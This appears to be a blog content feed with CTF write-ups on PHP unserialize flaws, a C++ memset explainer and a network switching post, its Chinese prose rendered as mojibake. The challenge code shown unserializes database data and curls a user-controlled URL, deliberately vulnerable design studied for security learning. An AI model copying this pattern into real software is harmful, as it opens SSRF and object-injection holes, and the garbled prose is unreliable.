<span class="variable">$_GET</span>[<span class="string">&#x27;no&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$db</span>-&gt;anti_sqli(<span class="variable">$no</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack ~_~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;getUserByNo(<span class="variable">$no</span>);</span><br><span class="line"><span class="variable">$user</span> = unserialize(<span class="variable">$res</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="comment">//print_r($res);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;table class=&quot;table&quot;&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                username</span><br><span class="line">            &lt;/th&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                age</span><br><span class="line">            &lt;/th&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                blog</span><br><span class="line">            &lt;/th&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$res</span>[<span class="string">&#x27;username&#x27;</span>]; <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$user</span>-&gt;age; <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">echo</span> xss(<span class="variable">$user</span>-&gt;blog); <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line"></span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;p&gt;the contents of his/her blog&lt;/p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$user</span>-&gt;getBlogContents();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$response</span> === <span class="number">404</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;404 Not found&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$base64</span> = base64_encode(<span class="variable">$response</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,<span class="subst">&#123;$base64&#125;</span>&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// echo $response;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// var_dump($user-&gt;getBlogContents());</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;getUserByNo(<span class="variable">$no</span>);</span><br><span class="line"><span class="variable">$user</span> = unserialize(<span class="variable">$res</span>[<span class="string">&#x27;data&#x27;</span>]);<span class="comment">//è¿™å¥è¯ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆè¦å¯¹åº”ç¬¬å››ä¸ªå­—æ®µã€‚</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸¤å¥è¯å°è¯äº†æˆ‘çš„æ€è·¯ï¼šååºåˆ—åŒ–æ•°æ®åº“ä¸­çš„dataå­—æ®µâ€”å­˜æ”¾çš„userï¼Œååºåˆ—åŒ–åè°ƒç”¨getBlogContents()ï¼Œåœ¨getBlogContents()ä¸­è°ƒç”¨get(user-&gt;blog)ï¼Œåœ¨è¿™é‡Œé¢CURLè¯·æ±‚ï¼Œç„¶ååœ¨å‰ç«¯è¾“å‡ºbase64åŠ å¯†çš„å€¼ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æˆ‘å¤ªèœäº†ã€‚ç»¼åˆåˆ©ç”¨è¿˜æ˜¯ä¸è¡Œï¼Œè¯´æ˜æˆ‘æ¯ä¸ªç‚¹è¿˜æ²¡éƒ½å¼„æ˜ç™½ã€‚å°¤å…¶æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œåªèƒ½çœ‹ä¸ªå¤§æ¦‚ï¼Œå¤æ‚çš„å°±ä¸æ‡‚äº†ï¼Œè¿˜éœ€è¦ç»§ç»­å­¦ä¹ </p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++ memset</title>
      <link href="2020/04/20/c-memset/"/>
      <url>2020/04/20/c-memset/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘ä¸€ç›´åœ¨åšåŠ¨æ€è§„åˆ’æœ‰å…³çš„é—®é¢˜ï¼Œå¹¶ä¸”ç»å¸¸æ€§çš„éœ€è¦æŠŠdpæ•°ç»„ç½®ä¸º0ï¼Œå°±ç»å¸¸æ€§çš„ç”¨memset(dp,0,sizeof(dp))è¿™ä¹ˆå†™ã€‚ã€‚ç›´åˆ°ä»Šå¤©ã€‚<br>ä»Šå¤©é‡åˆ°äº†ä¸€é“é¢˜ éœ€è¦æŠŠdpæ•°ç»„åˆå§‹åŒ–ä¸º1ï¼Œæˆ‘å°±åƒå¾€å¸¸ä¸€æ ·å†™äº†memset(dp,1,sizeof(dp))ï¼Œä½†æ˜¯æ•´ä½“ä»£ç å†™å®Œåæ€ä¹ˆéƒ½ä¸å¯¹ ç„¶åè¾“å‡ºä¸€çœ‹ä¸€ä¸²å¥‡æ€ªçš„æ•°å­—16843009ã€‚ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">memset</span>(a,<span class="number">1</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">cout&lt;&lt;a[i]&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>what happened?<br>é¦–å…ˆè¦çŸ¥é“memsetåœ¨å“ªï¼Œåœ¨string.hå¤´æ–‡ä»¶é‡Œé¢ã€‚<br>memsetæ˜¯æŒ‰å­—èŠ‚èµ‹å€¼ï¼Œint4å­—èŠ‚ï¼Œmemset(dp,1,sizeof(dp))è¿™å¥è¯çš„æ„æ€å°±æ˜¯æŠŠæ¯ä¸ªintå‹çš„dpçš„æ¯ä¸ªå­—èŠ‚éƒ½èµ‹å€¼ä¸º00000001ï¼Œé‚£ä¹ˆæ¯ä¸ªintå‹dpå…ƒç´ çš„å€¼ä¸ºï¼š<br>00000001 00000001 00000001 00000001ï¼Œè½¬æ¢æˆåè¿›åˆ¶å°±æ˜¯16843009ã€‚é‚£ä¸ºä»€ä¹ˆèµ‹å€¼0æˆ–è€…-1æ²¡é”™ï¼Ÿ<br>å› ä¸º0çš„è¡¥ç æ˜¯00000000ï¼Œ-1çš„è¡¥ç æ˜¯11111111ï¼Œå†ç¿»è¯‘å›å»è¿˜æ˜¯0å’Œ-1ã€‚æ‰€ä»¥é™¤äº†0å’Œ-1èµ‹å€¼çš„è¯å¯ä»¥ç”¨fillã€‚<br>æ¯”å¦‚fill(a,a+n,1)è¿™æ ·å°±å¯ä»¥æŠŠæ•°ç»„açš„æ¯ä¸€ä¸ªå…ƒç´ çš„å€¼éƒ½èµ‹å€¼ä¸º1äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äºŒå±‚äº¤æ¢andä¸‰å±‚äº¤æ¢</title>
      <link href="2020/04/20/%E4%BA%8C%E5%B1%82%E4%BA%A4%E6%8D%A2and%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2/"/>
      <url>2020/04/20/%E4%BA%8C%E5%B1%82%E4%BA%A4%E6%8D%A2and%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="äºŒå±‚äº¤æ¢ä¸ä¸‰å±‚äº¤æ¢çš„é—®é¢˜å…¶å®æ˜¯å¶ç„¶çœ‹åˆ°çš„ï¼Œçœ‹æŸæ ¡å¤ä»¤è¥ç»éªŒè´´çœ‹åˆ°æœ‰æé—®è¿™ä¸ªé—®é¢˜ï¼Œæ­£å¥½æˆ‘ä¸ä¼šï¼Œè®°å½•ä¸€ä¸‹ã€‚"><a href="#äºŒå±‚äº¤æ¢ä¸ä¸‰å±‚äº¤æ¢çš„é—®é¢˜å…¶å®æ˜¯å¶ç„¶çœ‹åˆ°çš„ï¼Œçœ‹æŸæ ¡å¤ä»¤è¥ç»éªŒè´´çœ‹åˆ°æœ‰æé—®è¿™ä¸ªé—®é¢˜ï¼Œæ­£å¥½æˆ‘ä¸ä¼šï¼Œè®°å½•ä¸€ä¸‹ã€‚" class="headerlink" title="äºŒå±‚äº¤æ¢ä¸ä¸‰å±‚äº¤æ¢çš„é—®é¢˜å…¶å®æ˜¯å¶ç„¶çœ‹åˆ°çš„ï¼Œçœ‹æŸæ ¡å¤ä»¤è¥ç»éªŒè´´çœ‹åˆ°æœ‰æé—®è¿™ä¸ªé—®é¢˜ï¼Œæ­£å¥½æˆ‘ä¸ä¼šï¼Œè®°å½•ä¸€ä¸‹ã€‚"></a>äºŒå±‚äº¤æ¢ä¸ä¸‰å±‚äº¤æ¢çš„é—®é¢˜å…¶å®æ˜¯å¶ç„¶çœ‹åˆ°çš„ï¼Œçœ‹æŸæ ¡å¤ä»¤è¥ç»éªŒè´´çœ‹åˆ°æœ‰æé—®è¿™ä¸ªé—®é¢˜ï¼Œæ­£å¥½æˆ‘ä¸ä¼šï¼Œè®°å½•ä¸€ä¸‹ã€‚</h1><p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://zhuanlan.zhihu.com/p/64455461">https://zhuanlan.zhihu.com/p/64455461</a><br><a href="https://blog.csdn.net/Apollon_krj/article/details/82086174">https://blog.csdn.net/Apollon_krj/article/details/82086174</a><br><a href="https://blog.csdn.net/lycb_gz/article/details/8780851">https://blog.csdn.net/lycb_gz/article/details/8780851</a><br>äºŒå±‚äº¤æ¢æœºå·¥ä½œåœ¨æ•°æ®é“¾è·¯å±‚ï¼Œæ ¹æ®MACåœ°å€å¯¹å¸§è¿›è¡Œè½¬å‘ï¼›<br>ä¸‰å±‚äº¤æ¢æœºå·¥ä½œåœ¨ç½‘ç»œå±‚ï¼Œå¯¹äºè·¨ç½‘æ®µçš„é€šä¿¡ï¼Œå¯ä»¥åšåˆ°ä¸€æ¬¡è·¯ç”±ï¼Œå¤šæ¬¡äº¤æ¢ã€‚</p><h2 id="ç”¨åˆ°çš„çŸ¥è¯†ç‚¹"><a href="#ç”¨åˆ°çš„çŸ¥è¯†ç‚¹" class="headerlink" title="ç”¨åˆ°çš„çŸ¥è¯†ç‚¹"></a>ç”¨åˆ°çš„çŸ¥è¯†ç‚¹</h2><p>åœ¨è¯´äºŒä¸‰å±‚è½¬å‘ä¹‹å‰å…ˆæ€»ç»“ä¸€ä¸‹ç”¨åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œè™½ç„¶æˆ‘å­¦è¿‡ä¸€éè®¡ç®—æœºç½‘ç»œï¼Œä½†è‡ªè®¤ä¸ºå­¦çš„å¾ˆèœã€‚ã€‚æœ‰äº›åœ°æ–¹éƒ½å¿˜äº†ã€‚ã€‚ç”šè‡³æŸåè®®é¦–éƒ¨æŸå­—æ®µè¿˜æ²¡è®°ä½23333<br>1.ARP<br>ARPåè®®æ˜¯ç”±IPåœ°å€è·å¾—MACåœ°å€ï¼Œå‡è®¾ä¸¤å°ä¸»æœºåœ¨åŒä¸€ç½‘æ®µï¼ŒAå‘Bå‘æ¶ˆæ¯ï¼ŒAçŸ¥é“Bçš„IPåœ°å€ ä½†æ˜¯ä¸çŸ¥é“Bçš„macåœ°å€ï¼Œæ‰€ä»¥åœ¨å±€åŸŸç½‘å†…å‘ä¸ªå¹¿æ’­ï¼Œç›®çš„MACå…¨ä¸ºFï¼Œæ„æ€å°±æ˜¯ï¼šâ€œè°çš„IPåœ°å€ä¸º192.168.2.2ï¼Ÿèµ¶ç´§æŠŠmacåœ°å€å‘Šè¯‰æˆ‘â€<br>å±€åŸŸç½‘å†…å…¶ä»–ä¸»æœºçœ‹åˆ°è¿™æ¡æ¶ˆæ¯åå‘ç°ç›®çš„ipä¸æ˜¯è‡ªå·±çš„ï¼Œäºæ˜¯ä¸¢å¼ƒï¼›Bçœ‹åˆ°åå‘ç°æ˜¯æ‰¾çš„è‡ªå·±ï¼Œäºæ˜¯æŠŠè‡ªå·±çš„macåœ°å€å‘ç»™äº†Aï¼Œäºæ­¤åŒæ—¶Båœ¨è‡ªå·±çš„ARPè¡¨ä¸­è®°å½•ä¸‹Açš„IPä¸MACåœ°å€çš„æ˜ å°„å…³ç³»ã€‚<br>Aæ”¶åˆ°Bå‘çš„æ¶ˆæ¯åä¹ŸæŠŠBçš„IPä¸MACçš„æ˜ å°„å…³ç³»è®°å½•åˆ°è‡ªå·±çš„ARPè¡¨ä¸­ã€‚ã€‚è¿™å°±æ˜¯ä¸€æ¬¡ç®€å•çš„ARPè¯·æ±‚<br>2.è·¨ç½‘æ®µé€šä¿¡<br>å‡è®¾Aå’ŒBä¸åœ¨ä¸€ä¸ªç½‘æ®µï¼Œé€šä¿¡è¿‡ç¨‹åº”è¯¥æ˜¯è¿™æ ·ï¼š<br>å…ˆå’Œå­ç½‘æ©ç ç›¸ä¸ï¼Œå‘ç°ä¸åœ¨ä¸€ä¸ªç½‘æ®µï¼Œç„¶åæ‰¾è‡ªå·±çš„ç½‘å…³ï¼ŒæŠŠæ•°æ®å‘ç»™ç½‘å…³è®©ç½‘å…³ä»£ä¸ºè½¬å‘ï¼›åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¦‚æœä¸çŸ¥é“ç½‘å…³çš„MACå°±æ¥ä¸€æ¬¡ARPã€‚å‘é€ç»™ç½‘å…³åï¼ŒæŸ¥ä¸€ä¸‹è·¯ç”±è¡¨ï¼Œçœ‹çœ‹ä¸‹ä¸€è·³è¯¥å‘åˆ°å“ªäº†ï¼Œå°±è¿™æ ·ä¸€ç›´è½¬å‘ï¼ŒæŸ¥æ‰¾ä¸‹ä¸€è·³ï¼Œè½¬å‘ã€‚ã€‚æ— é™å¥—å¨ƒã€‚å¥—åˆ°æœ€åèŠ‚ç‚¹ï¼Œå‘ç°ç›®çš„IPåœ¨è‡ªå·±çš„ç½‘æ®µï¼Œå…ˆçœ‹çœ‹ARPè¡¨æœ‰æ²¡æœ‰è®°å½•ï¼Œæ²¡æœ‰çš„è¯å‘ä¸€æ¬¡ARPè¯·æ±‚ï¼Œæœ‰çš„è¯å°±ç›´æ¥æŠŠè¯·æ±‚å‘ç»™ç›®çš„IPäº†ã€‚<br>3.ARPè¡¨ macè¡¨<br>äºŒå±‚äº¤æ¢æœºç»´æŠ¤MACè¡¨ï¼Œä¸»æœºç»´æŠ¤ARPè¡¨</p><h2 id="äºŒå±‚äº¤æ¢"><a href="#äºŒå±‚äº¤æ¢" class="headerlink" title="äºŒå±‚äº¤æ¢"></a>äºŒå±‚äº¤æ¢</h2><p>äºŒå±‚äº¤æ¢æ˜¯æ•°æ®é“¾è·¯å±‚çš„äº¤æ¢ï¼Œæ ¹æ®macåœ°å€äº¤æ¢ã€‚äºŒå±‚äº¤æ¢é€šä¿¡ä¸èƒ½è·¨ç½‘æ®µï¼ˆæ¯”å¦‚vlanï¼‰ã€‚<br>äºŒå±‚äº¤æ¢æœºç»´æŠ¤çš„MACè¡¨æ˜¯ç«¯å£å’ŒMACåœ°å€çš„æ˜ å°„å…³ç³»ã€‚</p><h2 id="ä¸‰å±‚äº¤æ¢"><a href="#ä¸‰å±‚äº¤æ¢" class="headerlink" title="ä¸‰å±‚äº¤æ¢"></a>ä¸‰å±‚äº¤æ¢</h2><p>ä¸‰å±‚äº¤æ¢åˆè¢«å«åšä¸€æ¬¡è·¯ç”±ï¼Œå¤šæ¬¡äº¤æ¢ã€‚<br>è¿™æ˜¯å•¥æ„æ€ï¼Ÿ<br>å…ˆè¯´ä¸€ä¸ªç®€å•çš„ï¼š<br>å‡è®¾ä¸€å°ä¸‰å±‚äº¤æ¢æœºåˆ’åˆ†äº†vlan1å’Œvlan2ï¼Œaåœ¨vlan1ï¼Œbåœ¨vlan2ï¼Œaç¬¬ä¸€æ¬¡ç»™bå‘æ•°æ®çš„æ—¶å€™è¿˜æ˜¯æ­£å¸¸èµ°è·¯ç”±è¡¨ï¼Œç­‰æ•´ä¸ªè¿‡ç¨‹ç»“æŸåä¸‰å±‚äº¤æ¢æœºä¼šè®°å½•ä¸‹ä¸€æ¡æ•°æ®ï¼ŒåŒ…æ‹¬äº†Aå’ŒBçš„macåœ°å€ç«¯å£ç­‰ç›¸å…³ä¿¡æ¯ï¼Œä¸‹æ¬¡Aå’ŒBé€šä¿¡çš„æ—¶å€™ç›´æ¥æ ¹æ®è¿™æ¡æ•°æ®é€šè¿‡äºŒå±‚è½¬å‘äº†ï¼Œå°±ä¸ç”¨å†èµ°è·¯ç”±äº†ã€‚<br>of course,äº‹æƒ…æ²¡æœ‰é‚£ä¹ˆç®€å•ï¼Œtoo simple,sometimes naive!<br>ä¸Šé¢è¿™å¥è¯å°±å›¾ä¸€ä¹ï¼Œå°±åƒé¢è¯•é—®TCP ä¸‰æ¬¡æ¡æ‰‹çš„æ—¶å€™ä½ è¯´â€œå®¢æˆ·ç«¯å‘è¯·æ±‚ï¼ŒæœåŠ¡å™¨å“åº”ï¼Œå®¢æˆ·ç«¯å†å‘ä¸€ä¸ªè¯·æ±‚ï¼Œå»ºç«‹è¿æ¥ã€‚â€ä¸€æ ·ï¼Œå¤ªä¸ä¸“ä¸šäº†ã€‚<br>å¥½çš„ æ¥ä¸‹æ¥è¯´ä¸ªå¤æ‚çš„ã€‚</p><h2 id="ä¸‰å±‚äº¤æ¢è·¨ç½‘æ®µé€šä¿¡"><a href="#ä¸‰å±‚äº¤æ¢è·¨ç½‘æ®µé€šä¿¡" class="headerlink" title="ä¸‰å±‚äº¤æ¢è·¨ç½‘æ®µé€šä¿¡"></a>ä¸‰å±‚äº¤æ¢è·¨ç½‘æ®µé€šä¿¡</h2><p>ä¸»æœºAå’ŒBåœ¨åŒä¸€ä¸ªäº¤æ¢æœºï¼Œä½†æ˜¯åœ¨ä¸åŒvlanã€‚è§‚å¯Ÿaå’Œbçš„é€šä¿¡è¿‡ç¨‹<br>åˆå§‹åŒ–ï¼Œaå‘ç°bå’Œè‡ªå·±ä¸ä¸€ä¸ªç½‘æ®µå¹¶ä¸”ä¸çŸ¥é“ç½‘å…³çš„macï¼Œå¹¿æ’­ä¸€ä¸ªARPï¼Œç›®çš„æ˜¯æ‰¾åˆ°ç½‘å…³çš„MACã€‚<br>ç½‘å…³æ”¶åˆ°ARPè¯·æ±‚åæŠŠè‡ªå·±çš„macåœ°å€å‘ç»™aï¼Œå¹¶ä¸”åœ¨è‡ªå·±çš„arpè¡¨ä¸­è®°å½•aç«¯å£å’Œmacçš„æ˜ å°„å…³ç³»ã€‚<br>ç„¶åæŠŠAçš„IPåœ°å€ï¼ˆä½œä¸ºâ€œç›®çš„IPåœ°å€â€ï¼‰ã€MACåœ°å€ï¼ˆä½œä¸ºâ€œä¸‹ä¸€è·³MACåœ°å€â€ï¼‰ï¼Œä»¥åŠä¸äº¤æ¢æœºç›´æ¥ç›¸è¿çš„ç«¯å£å·ç­‰ä¿¡æ¯ä¸‹å‘åˆ°ä¸‰å±‚äº¤æ¢æœºASICèŠ¯ç‰‡ä¸­çš„ä¸‰å±‚ç¡¬ä»¶è½¬å‘è¡¨ã€‚æ­¤æ—¶åœ¨ä¸‰å±‚ç¡¬ä»¶è½¬å‘è¡¨ä¸­å°±æœ‰äº†ç¬¬ä¸€ä¸ªè½¬å‘è¡¨é¡¹ï¼Œå³Açš„è½¬å‘è¡¨é¡¹ã€‚<br>Aæ”¶åˆ°ç½‘å…³çš„åº”ç­”åï¼ŒæŠŠç›®çš„åœ°å€ä¿®æ”¹é—®ç½‘å…³çš„macï¼Œå¹¶ä¸”æŠŠæ•°æ®åŒ…å‘ç»™ç½‘å…³<br>ç½‘å…³æ”¶åˆ°è¯·æ±‚åï¼Œå…ˆåœ¨ä¸‰å±‚ç¡¬ä»¶è½¬å‘è¡¨ä¸­æŸ¥æ‰¾ä¸Bæœ‰å…³è¡¨é¡¹ï¼Œç”±äºæ˜¯ç¬¬ä¸€æ¬¡é€šä¿¡ï¼Œæ‰€ä»¥æ²¡æœ‰ï¼Œç„¶åè¿›è¡Œè·¯ç”±ã€‚<br>CPUæ ¹æ®ç›®çš„åœ°å€åœ¨router tableä¸­æŸ¥æ‰¾next hopï¼Œå‘ç°äº†ç›´è¿çš„ä¸»æœºbï¼Œç„¶ååœ¨è‡ªå·±çš„arpè¡¨ä¸­æŸ¥bçš„macï¼Œæ²¡æœ‰æŸ¥åˆ°ï¼Œäºæ˜¯å‘ä¸ªå¹¿æ’­ï¼šæ‰¾Bçš„macã€‚<br>Bæ”¶åˆ°ARPè¯·æ±‚åæŠŠè‡ªå·±çš„macå‘ç»™äº¤æ¢æœºï¼Œè‡ªå·±ä¹Ÿç¼“å­˜ä¸‹ã€‚<br>äº¤æ¢æœºæ”¶åˆ°bçš„macåï¼Œåœ¨è‡ªå·±çš„arpè¡¨ä¸­è®°å½•ä¸‹ipä¸macçš„æ˜ å°„ï¼›åœ¨ä¸‰å±‚ç¡¬ä»¶è½¬å‘è¡¨ä¸­æ–°å¢ä¸€é¡¹ï¼š Bçš„IPåœ°å€ã€MACåœ°å€ã€è¿›å…¥äº¤æ¢æœºçš„ç«¯å£å·ç­‰ä¿¡æ¯ã€‚<br>è¿™æ ·å°±å®Œæˆäº†ç¬¬ä¸€æ¬¡Aå’ŒBçš„é€šä¿¡ï¼Œä¸‰å±‚äº¤æ¢æœºçš„ç¡¬ä»¶è½¬å‘è¡¨ä¸­å¤šäº†ä¸¤é¡¹ï¼šåˆ†åˆ«æ˜¯<br>Açš„IP Açš„port Açš„mac Açš„vlan ã€‚ã€‚ã€‚<br>Bçš„IP Bçš„PORT Bçš„MAC Bçš„VLAN ã€‚ã€‚ã€‚<br>ç­‰ä¸‹æ¬¡æœ‰åˆ«çš„ä¸»æœºæƒ³å’ŒAæˆ–è€…Bé€šä¿¡çš„æ—¶å€™ï¼Œç”±äºè¡¨ä¸­æœ‰è®°å½•ï¼Œç›´æ¥èµ°è¡¨ä¸­è®°å½•çš„ç«¯å£è½¬å‘è¿‡å»å°±å¯ä»¥äº†ã€‚<br>å³ ä¸€æ¬¡è·¯ç”±ï¼Œå¤šæ¬¡äº¤æ¢~ï¼ˆé¦–å°¾å‘¼åº”2333</p><h2 id="arpå…¨0å’Œå…¨fçš„é—®é¢˜"><a href="#arpå…¨0å’Œå…¨fçš„é—®é¢˜" class="headerlink" title="arpå…¨0å’Œå…¨fçš„é—®é¢˜"></a>arpå…¨0å’Œå…¨fçš„é—®é¢˜</h2><p>åœ¨ç½‘ç»œå±‚çš„ARPåè®®ï¼ˆTCP/IPæ¨¡å‹ï¼‰ä¸çŸ¥é“ç›®çš„macï¼Œæ‰€ä»¥æŠŠç›®çš„macç½®0ï¼›åˆ°äº†æ•°æ®é“¾è·¯å±‚ç½®ä¸ºå…¨F æ„ä¸ºå¹¿æ’­å¸§â€“æ•°æ®é“¾è·¯å±‚ä¸è®¤è¯†ipã€‚<br>å¦‚æœæœ‰é”™è¯¯æ¬¢è¿æå‡ºï¼Œå…±åŒè¿›æ­¥</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php unserialize</title>
      <link href="2020/04/17/php-unserialize/"/>
      <url>2020/04/17/php-unserialize/</url>
      
        <content type="html"><![CDATA[<h2 id="php-unserialize"><a href="#php-unserialize" class="headerlink" title="php unserialize"></a>php unserialize</h2><p>ä¹‹å‰æ²¡æ€ä¹ˆæ¥è§¦è¿‡PHPååºåˆ—åŒ–çš„é—®é¢˜ï¼Œè¿™ä¸¤å¤©ç¢°å·§åšäº†ä¸€é“å¾€å¹´çš„é¢˜ï¼Œé‡åˆ°äº†ï¼Œç®—æ˜¯åˆæ­¥äº†è§£äº†PHPååºåˆ—åŒ–çš„é—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹è§£å†³æ€è·¯<br>é¢˜ç›®é“¾æ¥ï¼š<a href="https://buuoj.cn/login?next=/challenges?#%5B0CTF%202016%5Dpiapiapia">https://buuoj.cn/login?next=%2Fchallenges%3F#%5B0CTF%202016%5Dpiapiapia</a></p><h2 id="ç¯å¢ƒæ¢æµ‹"><a href="#ç¯å¢ƒæ¢æµ‹" class="headerlink" title="ç¯å¢ƒæ¢æµ‹"></a>ç¯å¢ƒæ¢æµ‹</h2><p>PHPç‰ˆæœ¬5.6 æ²¡æœ‰å‘ç°å…¶ä»–æœ‰ç”¨ä¿¡æ¯<br>ç”¨æ‰«æå™¨æ‰«äº†ä¸€ä¸‹å‘ç°äº†ç½‘ç«™å¤‡ä»½ï¼Œä¸‹è½½ä¸‹æ¥ã€‚</p><img src="http://cdn.polowong.top/static/images/uns1.jpg"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">class</span>.php</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span 